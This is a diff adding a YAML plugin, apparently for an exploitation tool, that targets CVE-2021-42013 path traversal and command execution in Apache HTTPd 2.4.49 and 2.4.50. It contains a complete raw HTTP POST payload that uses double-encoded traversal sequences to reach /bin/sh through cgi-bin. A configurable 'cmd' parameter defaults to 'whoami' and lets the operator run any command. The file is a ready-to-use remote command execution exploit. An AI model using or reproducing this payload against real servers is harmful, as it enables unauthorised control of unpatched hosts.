@@ -1,0 +1,41 @@
+info:
+    app: apache_httpd
+    name: CVE_2021_42013
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: "2021-10-06"
+    create_date: "2024-10-06 04:14:08"
+    update_date: "2024-10-06 04:14:08"
+    scope: |-
+        Apache HTTPd 2.4.49
+        Apache HTTPd 2.4.50
+    description: Apache HTTPd是Apache基金会开源的一款流行的HTTP服务器。2021年10月6日Apache HTTPd官方发布安全更新，披露了CVE-2021-41773 Apache HTTPd 2.4.49 路径穿越漏洞。在其2.4.49版本中，引入了一个路径穿越漏洞。在路径穿越目录允许被访问的的情况下，例如配置了 <Directory />Require all granted</Directory>，攻击者可利用该路径穿越漏洞读取到Web目录之外的其他文件。同时若Apache HTTPd开启了cgi支持，攻击者可构造恶意请求执行命令，控制服务器。
+    vul_id: CVE-2021-42013
+    detail: |-
+        1. 输入不带路径的目标，执行命令即可，目前只支持linux
+        PS: 由于存在%%符号，所以内置url库无法解析，使用socket发送。
+
+        payload2是CVE-2021-41773，用于测试
+    payload: |-
+        POST /cgi-bin/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1
+        Host: 30.1.20.3:18080
+        Pragma: no-cache
+        Cache-Control: no-cache
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 42
+
+        echo Content-Type: text/p1ain; echo;whoami
+payloads:
+    - name: cmd1
+      alias: 命令执行
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
